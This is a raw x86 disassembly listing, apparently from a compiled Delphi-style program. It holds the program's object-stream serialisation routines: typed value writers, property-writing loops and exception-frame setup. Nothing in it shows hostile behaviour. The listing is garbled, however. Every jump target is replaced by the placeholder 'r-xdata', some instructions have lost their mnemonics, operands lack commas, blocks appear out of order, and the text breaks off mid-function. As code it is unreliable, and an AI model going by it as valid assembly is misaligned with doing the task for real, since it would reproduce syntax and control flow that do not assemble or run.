pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_4202cc
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_41e334
sub_41e294
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41a8a0
cmp eax esi
jg r-xdata
mov eax ebx
call sub_41e3bc
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41a8c0
pop esi
pop ebx
retn
mov edx [ ebx + 0x10 ]
add edx eax
cmp esi edx
jle r-xdata
sub esi eax
mov [ ebx + 0x10 ] esi
pop esi
pop ebx
retn
sub_41e2e8
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41e3bc
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41e334
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e3ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov dl 0xa
mov eax ebx
call sub_420508
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41e2e8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_41e2e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e3b2
mov eax [ ebp - 0x4 ]
call sub_403190
retn
sub_41e3e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41e42b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404108
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_420400
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e432
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_41e438
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x20 ] edx
xor eax eax
push ebp
push sub_41e4ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0xe
mov eax [ ebp - 0x4 ]
call sub_420508
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41eca4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e4d1
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
retn
mov eax edi
call sub_4191f8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
call sub_41ec9c
mov edx esi
mov eax edi
call sub_419200
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41ecf0
mov eax [ ebp - 0x4 ]
call sub_41eca4
inc esi
dec ebx
jne r-xdata
sub_41e4d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor esi esi
inc ebx
xor edi edi
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx edi
call sub_418470
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_407e20
test al al
jne r-xdata
sub_41e528
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41e66f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
or [ eax + 0x1c ] 0x4
mov eax [ ebp - 0x8 ]
call sub_420d78
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_41e4d8
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_420d4c
or [ eax + 0x1c ] 0x4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
and [ eax + 0x1c ] 0xfffb
mov eax [ ebp - 0x8 ]
call sub_420d78
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_420d4c
test [ eax + 0x24 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e676
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x28 ] edx
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x28
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x20 ] edx
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_420d4c
and [ eax + 0x1c ] 0xfffb
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_420d4c
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41e67c
push ebp
mov ebp esp
add esp 0xfffffec8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x138 ] ecx
mov [ ebp - 0x12c ] ecx
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x134 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ea58
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4030e0
xor ebx ebx
mov bl [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_4041e0
add ebx eax
inc ebx
add ebx 0x5
add ebx 0x3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x10 ]
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e27c
mov [ ebp - 0xc ] eax
mov al [ r-xdata ]
mov [ ebp - 0x25 ] al
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e3bc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
or [ ebp - 0x25 ] 0x1
or [ ebp - 0x25 ] 0x4
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
mov dl [ ebp - 0x25 ]
mov eax [ ebp - 0x4 ]
call sub_41ecac
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
cmp eax [ ebx + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4030e0
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x138 ]
call sub_404184
mov edx [ ebp - 0x138 ]
mov eax [ ebp - 0x4 ]
call sub_420320
mov eax [ ebp - 0x8 ]
call sub_4030d8
call sub_4033d0
call sub_4147fc
lea edx [ eax + 0xa ]
lea eax [ ebp - 0x130 ]
call sub_404184
push [ ebp - 0x130 ]
push r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4030e0
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x134 ]
call sub_404184
push [ ebp - 0x134 ]
lea eax [ ebp - 0x12c ]
mov edx 0x3
call sub_4042a0
mov edx [ ebp - 0x12c ]
mov eax [ ebp - 0x4 ]
call sub_420320
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
or [ ebp - 0x25 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41ecf0
mov eax [ ebp - 0x4 ]
call sub_41eca4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_41e9f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
cmp edx [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_420320
mov eax [ ebp - 0x4 ]
call sub_41e27c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
or [ ebp - 0x25 ] 0x2
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_418470
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x20 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ea00
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x28 ] edx
retn
xor eax eax
push ebp
push sub_41e9b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
push eax
push sub_41e528
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov si 0xfffd
call sub_40338c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_403190
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_41e21c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov si 0xfffd
call sub_40338c
test [ ebx + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] ebx
sub_41ea00
mov eax [ ebp - 0x4 ]
call sub_41eca4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ea5f
lea eax [ ebp - 0x138 ]
mov edx 0x4
call sub_403f44
retn
mov al [ r-xdata ]
cmp al [ ebp - 0x25 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e27c
mov edx [ ebp - 0x10 ]
add edx 0x2
cmp eax edx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41e294
sub_41ea7c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x5
mov eax ebx
call sub_420508
lea edx [ ebp + 0x8 ]
mov ecx 0xa
mov eax ebx
call sub_41e2e8
pop ebx
pop ebp
retn 0xc
sub_41eaa0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0xf
mov eax ebx
call sub_420508
lea edx [ ebp + 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41e2e8
pop ebx
pop ebp
retn 0x4
sub_41eac4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x10
mov eax ebx
call sub_420508
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e2e8
pop ebx
pop ebp
retn 0x8
sub_41eae8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x11
mov eax ebx
call sub_420508
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e2e8
pop ebx
pop ebp
retn 0x8
sub_41eb0c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx r-xdata
mov eax esi
call sub_407e20
test al al
je r-xdata
mov edx r-xdata
mov eax esi
call sub_407e20
test al al
je r-xdata
mov dl 0x8
mov eax ebx
call sub_420508
pop esi
pop ebx
retn
mov edx r-xdata
mov eax esi
call sub_407e20
test al al
je r-xdata
mov dl 0x9
mov eax ebx
call sub_420508
jmp r-xdata
mov edx r-xdata
mov eax esi
call sub_407e20
test al al
je r-xdata
xor edx edx
mov eax ebx
call sub_420508
jmp r-xdata
pop esi
pop ebx
retn
mov dl 0x7
mov eax ebx
call sub_420508
mov edx esi
mov eax ebx
call sub_420320
mov dl 0xd
mov eax ebx
call sub_420508
jmp r-xdata
sub_41ebd0
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_420508
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e2e8
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_420508
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e2e8
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_420508
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41e2e8
jmp r-xdata
pop edx
pop ebx
retn
sub_41ec44
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov dl 0x13
mov eax ebx
call sub_420508
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e2e8
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ebx
call sub_41ebd0
jmp r-xdata
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_41ecac
push ebx
push esi
push ecx
mov esi ecx
mov [ esp ] dl
mov ebx eax
mov al [ r-xdata ]
cmp al [ esp ]
je r-xdata
pop edx
pop esi
pop ebx
retn
mov al [ esp ]
or al 0xf0
mov [ esp + 0x1 ] al
lea edx [ esp + 0x1 ]
mov ecx 0x1
mov eax ebx
call sub_41e2e8
test [ esp ] 0x2
je r-xdata
mov edx esi
mov eax ebx
call sub_41ebd0
sub_41ecf0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4033d0
call sub_4147fc
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_4026dc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41ed9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4033d0
mov edx [ ebp - 0x10 ]
call sub_414a00
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0xc ]
shl edx 0x2
mov eax [ ebp - 0x10 ]
call sub_4026fc
retn
inc esi
xor edi edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_414a54
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41fd84
mov eax [ ebp - 0x10 ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
sub_41edb8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4030d8
mov edx eax
mov eax [ edi ]
call sub_4033bc
test al al
jne r-xdata
mov al 0x1
sub_41ede8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414a84
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax 0x80000000
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414a84
cmp ebx eax
sete al
pop ebx
pop ebp
retn
xor eax eax
jmp r-xdata
cmp eax ebx
je r-xdata
pop ebx
pop ebp
retn
mov al 0x1
sub_41ee40
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414fb4
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
sete al
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414fb4
fld [ ebp - 0x10 ]
fcompp
fnstsw ax
sahf
sete al
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_41ee9c
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4153d0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4153d0
cmp edx [ ebp - 0x4 ]
jne r-xdata
sete al
cmp [ ebp - 0x8 ] 0x0
sete al
jmp r-xdata
cmp eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_41eef4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41ef73
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414df8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_404778
sete bl
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414df8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_404778
sete bl
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ef7a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404618
retn
sub_41ef84
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
pop esi
pop ebx
pop ebp
retn
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407e20
test al al
jne r-xdata
mov al 0x1
sub_41efc4
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
sete al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414a84
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
call sub_41ef84
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
sub_41f01c
push ebp
mov ebp esp
push ecx
push ebx
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414a84
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
push ebp
call sub_41efc4
pop ecx
test al al
jne r-xdata
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
push ebp
call sub_41efc4
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
sub_41f09c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41f148
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
sete bl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f14f
lea eax [ ebp - 0x8 ]
call sub_40578c
lea eax [ ebp - 0x4 ]
call sub_40578c
retn
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415434
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebp - 0x4 ]
sete bl
test bl bl
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_40578c
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d1e0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_41ef84
pop ecx
mov ebx eax
sub_41f168
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_41f225
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415434
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_40578c
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d1e0
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f22c
lea eax [ ebp - 0x10 ]
call sub_40578c
lea eax [ ebp - 0xc ]
call sub_40578c
lea eax [ ebp - 0x4 ]
call sub_40578c
retn
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415434
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
call sub_41f09c
pop ecx
test al al
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
sub_41f244
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415358
